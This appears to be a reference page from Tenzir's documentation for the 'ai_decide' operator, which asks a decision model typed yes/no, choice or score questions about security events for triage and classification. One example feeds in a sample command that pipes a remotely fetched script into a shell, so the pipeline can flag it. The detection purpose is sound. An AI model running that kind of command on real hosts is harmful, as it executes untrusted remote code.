---
title: "ai_decide"
canonical: https://tenzir.com/docs/reference/operators/ai_decide
source: https://tenzir.com/docs/reference/operators/ai_decide.md
section: "Docs"
---

# ai_decide

> Asks a decision model typed questions about each event and adds the answers to the event.

Asks a decision model typed questions about each event and adds the answers to the event.

```tql
ai_decide [question:string], model=string, endpoint=string,
          [choices=record, scale=list, questions=record, state=any,
           into=field, api_key=string, timeout=duration,
           concurrency=uint, tls=record]
```

## Description

The `ai_decide` operator sends one request per input event to a **decision model**. A decision model doesn’t generate text. It reads the event and answers questions with typed values that a pipeline can filter on directly, such as a probability or one option out of a fixed set. Decisions are cheaper and faster than prompting a large language model, so you can ask them about every event and reserve [`ai_prompt`](https://tenzir.com/docs/reference/operators/ai_prompt.md) for the events that need an explanation.

The operator speaks the System One API, which hosted and self-hosted decision models implement. It appends `/systemone` to the `endpoint` and sends a `POST` request with the model, the questions, and the event under evaluation. For example, hosted Jev from TypeSafe AI uses the endpoint `https://api.typesafe.ai/v1`, and a local [Laya](https://laya.tools) server started with `laya-serve` uses `http://127.0.0.1:8000/v1`.

### Question types

Every question has one of three types:

| Type     | Asks                                      | Answer                                                                                                               |
| -------- | ----------------------------------------- | -------------------------------------------------------------------------------------------------------------------- |
| `noul`   | A yes/no question                         | `probability`: the probability of yes, from 0 to 1                                                                   |
| `choice` | Which of several named options fits       | `choice`: the most likely option, `probabilities`: the probability of every option                                   |
| `score`  | Where the event falls on an ordered scale | `score`: the expected level, from 0 to the number of levels minus 1, `probabilities`: the probability of every level |

A score is the probability-weighted average of the level indexes. With the levels `["Routine", "Unusual", "Dangerous"]`, a score of `1.7` means that the event is mostly dangerous. The score can fall between two levels.

### Ask one question

Pass a question as the first argument. Without further arguments, the model answers it with yes or no. Add `choices` to pick one of several options, or `scale` to rate the event on ordered levels. The operator writes the answer to the `answer` field of the result:

```tql
ai_decide "Does this command download and run remote code?",
          state=cmd,
          model="jev-latest",
          endpoint="https://api.typesafe.ai/v1",
          api_key=secret("typesafe-api-key")
where ai.decide.answer.probability > 0.8
```

```tql
ai_decide "How risky is this command for the host?",
          scale=["Routine administration", "Unusual but plausible",
                 "Likely malicious"],
          state=cmd,
          model="jev-latest",
          endpoint="https://api.typesafe.ai/v1",
          api_key=secret("typesafe-api-key")
where ai.decide.answer.score >= 1.5
```

### Ask several questions

To ask several questions in one request, pass a `questions` record instead of a positional question. Each field of the record is a question ID, and each value describes a question with the fields `type`, `instructions`, and `criteria`, exactly as the System One API defines them. The operator writes the answers to the `answers` record of the result, keyed by question ID:

```tql
let $questions = {
  remote_code: {
    type: "noul",
    instructions: "Does the command download and run remote code?",
  },
  tactic: {
    type: "choice",
    instructions: "Which MITRE ATT&CK tactic fits best?",
    criteria: {discovery: null, execution: null, persistence: null},
  },
}
ai_decide questions=$questions,
          state=cmd,
          model="jev-latest",
          endpoint="https://api.typesafe.ai/v1",
          api_key=secret("typesafe-api-key")
where ai.decide.answers.remote_code.probability > 0.8
```

Questions are constants. Put the per-event data that the model should read into `state`. To point a question at a specific part of a record state, name the field in backticks, for example ``"Did `user` run `cmd` as root?"``.

### Choose what the model reads

The `state` argument is the content that the model evaluates. A string is sent as text. A record or list is sent as structured JSON, so the model sees field names and nesting. Other values, such as numbers or IP addresses, are sent as their JSON text. If `state` is `null`, the operator skips the request, emits a warning, and writes `null` to the result field.

By default, `state` is the whole event without the `ai` field and without the `into` field. This keeps the results of earlier AI operators out of the request. Pass `state=this` to send the event unchanged. Prefer a small record with only the fields that the question needs: the model reads less, answers faster, and decision models have a limited context.

### Check questions before the pipeline runs

Tenzir validates the questions when it compiles the pipeline. The pipeline doesn’t start if:

* A question has an unknown type, unknown fields, or empty instructions.
* A `choice` or `score` question has no criteria. A `noul` question doesn’t need criteria.
* The criteria of a `choice` question have fewer than two options.
* The criteria of a `score` question aren’t an ordered list, or have fewer than two levels or duplicate levels.
* The criteria of a `noul` question describe outcomes other than `true` and `false`.

When all levels of a scale are well-known words in descending order, such as `["High", "Medium", "Low"]`, the operator warns, because the first level always scores 0.

The server may enforce further limits, such as a maximum number of options per question.

### Result

The operator preserves input order, even when `concurrency` is greater than `1`. If a request fails or the server returns an invalid answer, such as a missing answer or a probability outside of 0 to 1, Tenzir emits a warning, keeps the input event, and writes `null` to the result field. Test for `null` to fail open, for example `where ai.decide == null or ai.decide.answer.score >= 1.5`.

The result field is a record. With a positional question, it holds the answer in `answer`. With `questions`, it holds the answers in `answers`, keyed by question ID. Each answer has the structure of its question type.

Result record

```tql
{
  // With a positional question:
  answer: <answer>,
  // With `questions`:
  answers: {
    <id>: <answer>,
    …
  },
  model: string | null,
  usage: {
    input_tokens: uint64 | null,
    output_tokens: uint64 | null,
    truncated: bool | null,
    truncated_questions: list<string> | null,
  } | null,
  latency: duration,
}
```

Answer to a `noul` question

```tql
{
  probability: double,
}
```

Answer to a `choice` question

```tql
{
  choice: string,
  // One field per option, in the order of the criteria:
  probabilities: {
    <option>: double | null,
    …
  },
  confidence: double | null,
}
```

Answer to a `score` question

```tql
{
  score: double,
  // The probability of level `i` at index `i`:
  probabilities: list<double | null>,
  confidence: double | null,
}
```

A probability is `null` when the server doesn’t report it.

Servers compute `confidence` differently, so don’t compare confidence values across servers. The `usage.truncated` field is `true` when the server had to cut the state to fit the model’s context, and `usage.truncated_questions` lists the affected questions. Only some servers, such as Laya, report truncation. A `null` value doesn’t prove that the model read the whole state.

### `question: string (optional)`

A yes/no question, or with `choices` or `scale`, a question about options or levels. The answer lands in the `answer` field of the result.

Use either `question` or `questions`.

### `model = string`

The model to use, such as `jev-latest` for hosted Jev.

This argument is required.

### `endpoint = string`

The base endpoint of a System One API server. The operator appends `/systemone` unless the endpoint already ends with it.

The endpoint is resolved as a [secret](../../explanations/secrets.md), so you can pass a secret name to avoid hardcoding sensitive URLs.

This argument is required.

### `choices = record (optional)`

Turns `question` into a `choice` question. Each field is an option name, and its value describes the option as a string, record, or list. Use `null` when the name alone describes the option. Requires at least two options.

### `scale = list (optional)`

Turns `question` into a `score` question. Each element describes a level, as a string, record, or list, ordered from lowest to highest. Requires at least two distinct levels.

### `questions = record (optional)`

Several questions to ask in one request, keyed by question ID. Each question is a record with these fields:

* `type`: `"noul"`, `"choice"`, or `"score"`.
* `instructions`: the question as a string, record, or list.
* `criteria`: for `choice`, a record of options as in `choices`; for `score`, a list of levels as in `scale`; for `noul`, an optional record with `"true"` and `"false"` fields that describe what yes and no mean.

### `state = any (optional)`

The content that the model evaluates.

Defaults to the event without the `ai` field and without the `into` field.

### `into = field (optional)`

The field where Tenzir writes the result record.

Defaults to `ai.decide`.

### `api_key = string (optional)`

Bearer token to send in the `Authorization` header.

If you omit this argument, Tenzir sends no authorization header. This is useful for local servers.

The API key is resolved as a [secret](../../explanations/secrets.md).

### `timeout = duration (optional)`

HTTP request timeout.

Defaults to `30s`.

### `concurrency = uint (optional)`

Maximum number of in-flight requests.

Defaults to `1`.

### `tls = record (optional)`

TLS options for the HTTP client.

## Examples

### Triage commands, then explain the risky ones

Rate every command with a cheap decision and send only risky commands to a language model for an explanation. The [`ai_prompt`](https://tenzir.com/docs/reference/operators/ai_prompt.md) operator leaves the `ai` field out of its request, so the model sees only the event:

```tql
from {process: {cmd_line: "curl -s https://203.0.113.7/x.sh | sh", user: "build"}},
     {process: {cmd_line: "git status", user: "dev"}}
ai_decide "How risky is this command for the host?",
          scale=["Routine development task", "Unusual but plausible",
                 "Likely malicious or destructive"],
          state=process.cmd_line,
          model="jev-latest",
          endpoint="https://api.typesafe.ai/v1",
          api_key=secret("typesafe-api-key")
where ai.decide.answer.score >= 1.5
ai_prompt model="qwen3.8",
          system="Explain in one sentence why this command is risky.",
          data={cmd: process.cmd_line, user: process.user}
select cmd=process.cmd_line,
       risk=ai.decide.answer.score,
       explanation=ai.prompt.text
```

### Classify logs with a local model

Pick an OCSF class for raw log lines with a local Laya server:

```tql
from {raw: "sshd[4242]: Failed password for root from 203.0.113.7 port 52211"}
ai_decide "Which OCSF event class fits this log best?",
          choices={
            authentication: "Authentication: logon and logoff attempts",
            http_activity: "HTTP Activity: web requests and responses",
            unknown: "Insufficient evidence or another class",
          },
          state=raw,
          model="english",
          endpoint="http://127.0.0.1:8000/v1"
select raw,
       class=ai.decide.answer.choice,
       probability=ai.decide.answer.probabilities[ai.decide.answer.choice]
```

### Ask several questions in one request

Assess an authentication event for personal data and urgency at once:

```tql
let $questions = {
  pii: {
    type: "noul",
    instructions: "Does this event contain personal data?",
    criteria: {
      "true": "Names, email addresses, or phone numbers of people",
      "false": "Only technical identifiers",
    },
  },
  urgency: {
    type: "score",
    instructions: "How urgently should an analyst look at this?",
    criteria: [
      "Routine review",
      "Investigate soon",
      "Investigate immediately",
    ],
  },
}
from {
  user: {name: "alex.morgan", email_addr: "alex.morgan@example.com"},
  status: "Failure",
  message: "Ten failed logins in one minute",
}
ai_decide questions=$questions,
          model="jev-latest",
          endpoint="https://api.typesafe.ai/v1",
          api_key=secret("typesafe-api-key")
select pii=ai.decide.answers.pii.probability,
       urgency=ai.decide.answers.urgency.score,
       truncated=ai.decide.usage.truncated
```

### Fail open when the model is unavailable

Keep events that the model could not assess, so that an outage doesn’t hide them:

```tql
ai_decide "Is this login suspicious?",
          state={user: user, src_ip: src_ip, app: app},
          model="jev-latest",
          endpoint=secret("decision-endpoint"),
          api_key=secret("decision-api-key"),
          timeout=5s
where ai.decide == null or ai.decide.answer.probability >= 0.5
```

## See Also

* [`ai_prompt`](https://tenzir.com/docs/reference/operators/ai_prompt.md)
* [Enrich events with AI](../../guides/enrich/enrich-events-with-ai.md)
